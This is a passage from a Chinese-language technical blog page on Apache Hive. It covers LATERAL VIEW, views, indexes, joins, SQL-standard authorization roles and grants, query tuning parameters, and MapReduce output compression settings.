explode、split)结合来使用<ul><li>首先通过UDTF函数拆分成多行，再将多行结果组合成一个支持别名的虚拟表</li><li>主要解决在select使用UDTF做查询过程中，查询只能包含单个UDTF，不能包含其他字段、以及多个UDTF的问题</li></ul></li><li>语法：<code>LATERAL VIEW udtf(expression) tableAlias AS columnAlias (&#39;,&#39; columnAlias)</code></li><li>案例(查询所有爱好和地址的个数，数据参考上文psn_dynamic_part表)</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 将每个人的爱好依次查询出来(多行，可能重复)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">col</span></span><br><span class="line"><span class="comment">book</span></span><br><span class="line"><span class="comment">music2</span></span><br><span class="line"><span class="comment">music3</span></span><br><span class="line"><span class="comment">book</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">select</span> explode(likes) <span class="keyword">from</span> psn_dynamic_part;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">keyvalue</span></span><br><span class="line"><span class="comment">addr1guangzhou</span></span><br><span class="line"><span class="comment">addr1guangzhou</span></span><br><span class="line"><span class="comment">addr1shanghai</span></span><br><span class="line"><span class="comment">add2beijing</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">select</span> explode(address) <span class="keyword">from</span> psn_dynamic_part;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 报错，无法执行：FAILED: SemanticException [Error 10081]: UDTF's are not supported outside the SELECT clause, nor nested in expressions</span></span><br><span class="line"><span class="comment">-- 因此需要结合Lateral View</span></span><br><span class="line"><span class="comment">-- select count(distinct(explode(likes))) from psn_dynamic_part; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- **Lateral View**，会产生MR任务</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">distinct</span>(myCol1)), <span class="keyword">count</span>(<span class="keyword">distinct</span>(myCol2)) <span class="keyword">from</span> psn_dynamic_part</span><br><span class="line">LATERAL <span class="keyword">VIEW</span> explode(likes) myTable1 <span class="keyword">AS</span> myCol1 </span><br><span class="line">LATERAL <span class="keyword">VIEW</span> explode(address) myTable2 <span class="keyword">AS</span> myCol2, myCol3;</span><br></pre></td></tr></table></figure><h4 id="Hive视图"><a href="#Hive视图" class="headerlink" title="Hive视图"></a>Hive视图</h4><ul><li>特点<ul><li>只能查询，不能做加载数据操作</li><li>视图的创建，只是保存一份元数据，查询视图时才执行对应的子查询，不支持物化视图(v3.0.0引入物化视图)</li><li>view的执行优先级更高于外部查询，view定义ORDER BY/LIMIT语句优先级也高于外部</li></ul></li><li>语法</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建视图</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [db_name.]view_name </span><br><span class="line">    [(column_name [<span class="keyword">COMMENT</span> column_comment], ...) ]</span><br><span class="line">    [<span class="keyword">COMMENT</span> view_comment]</span><br><span class="line">    [TBLPROPERTIES (property_name = property_value, ...)]</span><br><span class="line">    <span class="keyword">AS</span> <span class="keyword">SELECT</span> ... ;</span><br><span class="line"><span class="comment">--查询视图</span></span><br><span class="line"><span class="keyword">SELECT</span> colums <span class="keyword">FROM</span> <span class="keyword">view</span>;</span><br><span class="line"><span class="comment">--删除视图</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [db_name.]view_name;</span><br></pre></td></tr></table></figure><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建索引</span></span><br><span class="line"><span class="comment">-- as: 指定索引器</span></span><br><span class="line"><span class="comment">-- in table: 指定索引表，若不指定默认生成在default__psn_dynamic_part_idx_psn_name__表中</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">index</span> idx_psn_name <span class="keyword">on</span> <span class="keyword">table</span> psn_dynamic_part(<span class="keyword">name</span>)</span><br><span class="line"><span class="keyword">as</span> <span class="string">'org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler'</span></span><br><span class="line"><span class="keyword">with</span> <span class="keyword">deferred</span> <span class="keyword">rebuild</span></span><br><span class="line"><span class="keyword">in</span> <span class="keyword">table</span> idx_psn_name_table;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建完索引表后，不会立即创建索引数据，需要手动 rebuild 重建索引才会通过MR任务产生索引数据</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> idx_psn_name_table;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询索引</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">on</span> psn_dynamic_part;</span><br><span class="line"></span><br><span class="line"><span class="comment">--重建索引（建立索引之后必须重建索引才能生效），会产生MR任务创建索引数据</span></span><br><span class="line"><span class="comment">-- 每次数据增加了，必须重新执行来重建索引，因此所有很少使用，但是在特定场景可进行使用，如分析去年的数据(数据不会改变)</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">index</span> idx_psn_name <span class="keyword">on</span> psn_dynamic_part <span class="keyword">rebuild</span>;</span><br><span class="line"><span class="comment">-- 重建后 idx_psn_name_table 中的数据如下</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">idx_psn_name_table.nameidx_psn_name_table._bucketnameidx_psn_name_table._offsetsidx_psn_name_table.ageidx_psn_name_table.sex</span></span><br><span class="line"><span class="comment">test2hdfs://aezocn/user/hive/warehouse/psn_dynamic_part/age=18/sex=0/000000_0[0]180</span></span><br><span class="line"><span class="comment">smallehdfs://aezocn/user/hive/warehouse/psn_dynamic_part/age=18/sex=1/000000_0[0]181</span></span><br><span class="line"><span class="comment">test1hdfs://aezocn/user/hive/warehouse/psn_dynamic_part/age=20/sex=1/000000_0[0]201</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--删除索引</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> <span class="keyword">if</span> <span class="keyword">exists</span> idx_psn_name <span class="keyword">on</span> psn_dynamic_part;</span><br></pre></td></tr></table></figure><h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><ul><li><code>LEFT SEMI JOIN</code> 类似mysql中的exists</li><li>关联多张表时，尽可能使用相同的关联条件字段(不同的条件字段产生MR任务执行更耗时)</li><li>JOIN案例</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1 smalle tom</span></span><br><span class="line"><span class="keyword">select</span> a.id,a.name, b.name <span class="keyword">as</span> lang </span><br><span class="line"><span class="keyword">from</span> psn_dynamic_part a </span><br><span class="line"><span class="keyword">join</span> psn_bucket b <span class="keyword">on</span> a.id = b.id</span><br><span class="line"><span class="keyword">where</span> a.id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><blockquote><p><a href="https://cwiki.apache.org/confluence/display/Hive/SQL+Standard+Based+Hive+Authorization" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/SQL+Standard+Based+Hive+Authorization</a></p></blockquote><ul><li>hive授权模型<ul><li>Default Hive Authorization (Legacy Mode)<ul><li>hive默认授权: 设计目的仅仅只是为了防止用户产生误操作，而不是防止恶意用户访问未经授权的数据</li></ul></li><li>Storage Based Authorization in the Metastore Server<ul><li>基于存储的授权: 可以对Metastore中的元数据进行保护，但是没有提供更加细粒度的访问控制（例如：列级别、行级别）</li></ul></li><li>SQL Standards Based Authorization in HiveServer2<ul><li>基于SQL标准的Hive授权: <strong>完全兼容SQL的授权模型，推荐使用该模式</strong></li><li>默认包含两种角色: public、admin</li></ul></li></ul></li><li>基于SQL标准的hiveserver2授权模式的限制<ul><li>启用当前认证方式之后，dfs, add, delete, compile, and reset等命令被禁用</li><li>通过set命令设置hive configuration的方式被限制某些用户使用。（可通过修改配置文件hive-site.xml中hive.security.authorization.sqlstd.confwhitelist进行配置）</li><li>添加、删除函数以及宏的操作，仅为具有admin的用户开放</li><li>用户自定义函数（开放支持永久的自定义函数），可通过具有admin角色的用户创建，其他用户都可以使用</li><li>Transform功能被禁用</li></ul></li><li>基于SQL标准的hiveserver2授权模式配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hive-site.xml，修改后无需重启 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.security.authorization.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.enable.doAs<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 拥有admin角色的用户，多个使用逗号分割 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.users.in.admin.role<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>test<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.security.authorization.manager<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hive.ql.security.authorization.plugin.sqlstd.SQLStdHiveAuthorizerFactory<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.security.authenticator.manager<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hive.ql.security.SessionStateUserAuthenticator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>相关命令</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看所有存在的角色。默认包含两种角色：public、admin</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">roles</span>;</span><br><span class="line"><span class="comment">-- 查看当前具有的角色，尽管是admin账号登录，默认也是public角色，需要使用admin角色时再手动切换</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">current</span> <span class="keyword">roles</span>;</span><br><span class="line"><span class="comment">-- 设置当前用户角色: set role (role_name|all|none);</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">role</span> <span class="keyword">admin</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建角色(只有切换成admin才能进行创建角色、赋权等操作)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">role</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="comment">-- 删除角色</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">role</span> <span class="keyword">test</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将test角色的权限赋予abc这个用户(也可以是角色: grant test to role test2;)</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">test</span> <span class="keyword">to</span> <span class="keyword">user</span> abc; <span class="comment">-- 查看赋予用户abc的角色</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">role</span> <span class="keyword">grant</span> <span class="keyword">user</span> abc;</span><br><span class="line"><span class="keyword">show</span> principals <span class="keyword">test</span>; <span class="comment">-- 查看test角色下的用户或子角色</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 授权(给用户或角色)</span></span><br><span class="line"><span class="comment">-- 权限：INSERT | SELECT | UPDATE | DELETE | ALL</span></span><br><span class="line"><span class="comment">-- with grant option 类似mysql，即被赋权用户可以将此权限赋给其他人</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> psn <span class="keyword">to</span> <span class="keyword">role</span> <span class="keyword">test</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">update</span> <span class="keyword">on</span> <span class="keyword">table</span> psn <span class="keyword">to</span> <span class="keyword">user</span> abc;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">grant</span> <span class="keyword">role</span> <span class="keyword">test</span> <span class="keyword">on</span> <span class="keyword">table</span> psn; <span class="comment">-- 显示赋值给test用户的psn表的权限</span></span><br><span class="line"><span class="comment">-- 撤销权限：则abc用户将无法再查询abc</span></span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">select</span> <span class="keyword">on</span> <span class="keyword">table</span> psn <span class="keyword">from</span> <span class="keyword">role</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><h2 id="Hive调优"><a href="#Hive调优" class="headerlink" title="Hive调优"></a>Hive调优</h2><ul><li>说明<ul><li>Hive的存储层依托于HDFS，Hive的计算层依托于MapReduce，一般Hive的执行效率主要取决于SQL语句的执行效率，因此Hive的优化的核心思想是MapReduce的优化</li></ul></li><li><p>查看Hive执行计划</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--显示SQL的执行计划，添加extended关键字可以查看更加详细的执行计划</span></span><br><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> psn;</span><br><span class="line"><span class="keyword">explain</span> <span class="keyword">extended</span> <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> psn;</span><br></pre></td></tr></table></figure></li><li><p>Hive的抓取策略</p><ul><li>Hive的某些SQL语句需要转换成MapReduce的操作，某些SQL语句就不需要转换成MapReduce操作</li><li>理论上来说，所有的SQL语句都需要转换成MapReduce操作，只不过Hive在转换SQL语句的过程中会做部分优化，使某些简单的操作不再需要转换成MapReduce，例如<ul><li>select 仅支持本表字段</li><li>where仅对本表字段做条件过滤</li></ul></li><li>设置Hive的数据抓取策略: <code>set hive.fetch.task.conversion=more;</code> 取值 none|more(默认)</li></ul></li><li>Hive本地模式<ul><li>类似于MapReduce的操作，Hive的运行也分为本地模式和集群模式，在开发阶段可以选择使用本地执行，提高SQL语句的执行效率，验证SQL语句是否正确</li><li><strong>设置本地模式(仅开发环境使用)</strong> <code>set hive.exec.mode.local.auto=true;</code></li><li>注意：要想使用Hive的本地模式，文件个数不能超过4个，加载数据文件大小不能超过128M(<code>set hive.exec.mode.local.auto.inputbytes.max=128M</code>)，如果超过了，就算设置了本地模式，也会按照集群模式运行</li></ul></li><li>Hive并行模式<ul><li>在SQL语句足够复杂的情况下，可能在一个SQL语句中包含多个子查询语句，且多个子查询语句之间没有任何依赖关系，此时可以Hive运行的并行度</li><li><strong>设置Hive SQL的并行运行</strong> <code>set hive.exec.parallel=true;</code></li><li>注意：Hive的并行度并不是无限增加的，在一次SQL计算中，可以通过以下参数来设置最大并行的job的个数(<code>set hive.exec.parallel.thread.number;</code>)</li></ul></li><li>Hive严格模式<ul><li>Hive中为了提高SQL语句的执行效率，可以设置严格模式，充分利用Hive的某些特点</li><li>设置Hive的严格模式 <code>set hive.mapred.mode=strict;</code></li><li>注意：当设置严格模式之后，会有如下限制<ul><li>对于分区表，必须添加where对于分区字段的条件过滤</li><li>order by语句必须包含limit输出限制(order by实际很少使用)</li><li>限制执行笛卡尔积的查询</li></ul></li></ul></li><li>Hive排序，Hive中支持多种排序操作适合不同的应用场景<ul><li><code>sort by</code> 对于单个reduce的数据进行排序</li><li><code>distribute by</code> 分区排序，经常和sort by结合使用</li><li><code>cluster by</code> 相当于 sort by + distribute by<ul><li>cluster by不能通过asc、desc的方式指定排序规则；可通过 distribute by column sort by column asc|desc 的方式</li></ul></li><li><code>order by</code> 对于查询结果做全排序，只允许有一个reduce处理（当数据量较大时，应慎用。严格模式下，必须结合limit来使用）</li></ul></li><li><p>Hive join</p><ul><li>Hive 在多个表的join操作时尽可能多的使用相同的连接键，这样在转换MR任务时会转换成少的MR的任务</li><li><p>手动Map join，在map端完成join操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--SQL方式，在SQL语句中添加MapJoin标记（mapjoin hint）</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/*+ mapjoin(smalltable) */</span> smalltable.key, bigtable.value </span><br><span class="line"><span class="keyword">from</span> smalltable <span class="keyword">join</span> bigtable <span class="keyword">on</span> smalltable.key = bigtable.key;</span><br></pre></td></tr></table></figure></li><li><p>开启自动的Map Join(默认开启)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--通过修改以下配置启用自动的mapjoin(默认为true)</span></span><br><span class="line"><span class="comment">--该参数为true时，Hive自动对左边的表统计量，如果是小表就加入内存，即对小表使用Map join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--相关配置参数</span></span><br><span class="line"><span class="comment">--大表小表判断的阈值，如果表的大小小于该值则会被加载到内存中运行</span></span><br><span class="line"><span class="keyword">set</span> hive.mapjoin.smalltable.filesize;  </span><br><span class="line"><span class="comment">-- 是否忽略mapjoin hint即mapjoin标记，默认值：true</span></span><br><span class="line"><span class="keyword">set</span> hive.ignore.mapjoin.hint;</span><br></pre></td></tr></table></figure></li><li><p>大表join大表(无很好的解决方案，下面两个小优化点不一定起效)</p><ul><li>空key过滤：有时join超时是因为某些key对应的数据太多，而相同key对应的数据都会发送到相同的reducer上，从而导致内存不够。此时我们应该仔细分析这些异常的key，很多情况下，这些key对应的数据是异常数据，我们需要在SQL语句中进行过滤</li><li>空key转换：有时虽然某个key为空对应的数据很多，但是相应的数据不是异常数据，必须要包含在join的结果中，此时我们可以表a中key为空的字段赋一个随机的值，使得数据随机均匀地分不到不同的reducer上</li></ul></li></ul></li><li><p>Map-Side聚合</p><ul><li><p>Hive的某些SQL操作可以实现map端的聚合，类似于MR的combine操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--通过设置以下参数开启在Map端的聚合</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--相关配置参数</span></span><br><span class="line"><span class="comment">--map端group by执行聚合时处理的多少行数据（默认：100000）</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.mapaggr.checkinterval;</span><br><span class="line"><span class="comment">--进行聚合的最小比例（预先对100000条数据做聚合，若聚合之后的数据量/100000的值大于该配置0.5，则不会聚合）</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.min.reduction;</span><br><span class="line"><span class="comment">--map端聚合使用的内存的最大值</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.percentmemory;</span><br><span class="line"><span class="comment">--是否对GroupBy产生的数据倾斜做优化，默认为false</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.skewindata;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>合并小文件</p><ul><li><p>Hive在操作的时候，如果文件数目小，容易在文件存储端造成压力，给hdfs造成压力，影响效率</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--设置合并属性</span></span><br><span class="line"><span class="comment">--是否合并map输出文件</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.mapfiles=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--是否合并reduce输出文件</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.mapredfiles=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--合并文件的大小</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.size.per.task=<span class="number">256</span>*<span class="number">1000</span>*<span class="number">1000</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>合理设置Map以及Reduce的数量</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--Map数量相关的参数</span></span><br><span class="line"><span class="comment">--一个split的最大值，即每个map处理文件的最大值</span></span><br><span class="line"><span class="keyword">set</span> mapred.max.split.size;</span><br><span class="line"><span class="comment">--一个节点上split的最小值</span></span><br><span class="line"><span class="keyword">set</span> mapred.min.split.size.per.node;</span><br><span class="line"><span class="comment">--一个机架上split的最小值</span></span><br><span class="line"><span class="keyword">set</span> mapred.min.split.size.per.rack;</span><br><span class="line"><span class="comment">--Reduce数量相关的参数</span></span><br><span class="line"><span class="comment">--强制指定reduce任务的数量</span></span><br><span class="line"><span class="keyword">set</span> mapred.reduce.tasks;</span><br><span class="line"><span class="comment">--每个reduce任务处理的数据量</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.bytes.per.reducer;</span><br><span class="line"><span class="comment">--每个任务最大的reduce数</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.max;</span><br></pre></td></tr></table></figure></li><li><p>JVM重用</p><ul><li>适用场景：小文件个数过多，task个数过多</li><li>缺点：设置开启之后，task插槽会一直占用资源，不论是否有task运行，直到所有的task即整个job全部执行完成时，才会释放所有的task插槽资源</li><li>设置task插 <code>set mapred.job.reuse.jvm.num.tasks=n;</code> n为task插槽个数</li></ul></li></ul><h2 id="压缩和存储"><a href="#压缩和存储" class="headerlink" title="压缩和存储"></a>压缩和存储</h2><ul><li>MR支持的压缩编码: DEFAULT、gzip、bzip2、LZO、LZ4、Snappy(压缩比和压缩效率都适中)</li><li>要在Hadoop中启用压缩，可以配置如下参数（mapred-site.xml文件中）</li></ul><table><thead><tr><th>参数</th><th>默认值</th><th>阶段</th><th>建议</th></tr></thead><tbody><tr><td>io.compression.codecs   （在core-site.xml中配置）</td><td>org.apache.hadoop.io.compress.DefaultCodec, org.apache.hadoop.io.compress.GzipCodec, org.apache.hadoop.io.compress.BZip2Codec,org.apache.hadoop.io.compress.Lz4Codec</td><td>输入压缩</td><td>Hadoop使用文件扩展名判断是否支持某种编解码器</td></tr><tr><td>mapreduce.map.output.compress</td><td>false</td><td>mapper输出</td><td>这个参数设为true启用压缩</td></tr><tr><td>mapreduce.map.output.compress.codec</td><td>org.apache.hadoop.io.compress.DefaultCodec</td><td>mapper输出</td><td>使用LZO、LZ4或snappy编解码器在此阶段压缩数据</td></tr><tr><td>mapreduce.output.fileoutputformat.compress</td><td>false</td><td>reducer输出</td><td>这个参数设为true启用压缩</td></tr><tr><td>mapreduce.output.fileoutputformat.compress.codec</td><td>org.apache.hadoop.io.compress. DefaultCodec</td><td>reducer输出</td><td>使用标准工具或者编解码器，如gzip和bzip2</td></tr><tr><td>mapreduce.output.fileoutputformat.compress.type</td><td>RECORD</td><td>reducer输出</td><td>SequenceFile输出使用的压缩类型：NONE和BLOCK</td></tr></tbody></table><ul><li><p>开启Map输出阶段压缩</p><ul><li><p>开启map输出阶段压缩可以减少job中map和Reduce task间数据传输量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 开启hive中间传输数据压缩功能</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.compress.intermediate=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">-- 开启mapreduce中map输出压缩功能</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.map.output.compress=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">-- 设置mapreduce中map输出数据的压缩方式</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.map.output.compress.codec= org.apache.hadoop.io.compress.SnappyCodec;</span><br><span class="line"><span class="comment">-- 执行查询语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> psn;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>开启Reduce输出阶段压缩</p><ul><li><p>当Hive将输出写入到表中时，输出内容同样可以进行压缩。属性hive.exec.compress.output控制着这个功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启hive最终输出数据压缩功能(默认是false, 输出文件为文本文件)</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.compress.output=<span class="literal">true</span>;</span><br><span class="line"><span 